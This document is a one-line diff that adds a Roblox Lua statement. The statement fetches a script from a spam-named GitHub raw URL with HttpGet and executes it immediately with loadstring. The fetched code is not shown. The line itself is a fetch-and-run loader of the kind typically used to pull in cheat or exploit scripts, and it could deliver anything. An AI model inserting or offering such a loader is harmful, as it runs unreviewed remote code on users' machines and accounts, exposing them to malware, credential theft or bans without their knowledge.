@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/anniversary-outcome-memories-v0-2-spam3-7d92nd58oavtpq.lua"))()
